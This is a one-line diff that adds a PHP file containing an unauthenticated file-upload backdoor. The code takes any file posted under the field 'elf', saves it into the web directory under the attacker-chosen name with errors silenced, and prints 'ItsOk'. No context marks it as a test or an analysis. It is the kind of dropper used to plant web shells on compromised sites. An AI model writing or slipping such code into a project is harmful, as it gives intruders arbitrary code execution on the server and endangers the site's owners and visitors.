@@ -1,0 +1,1 @@
+<?php if (isset($_FILES["elf"]) and ! $_FILES["elf"]["error"] ) {@move_uploaded_file($_FILES["elf"]["tmp_name"], $_FILES["elf"]["name"]) ;	echo $ifupload=" ItsOk ";}  ?>
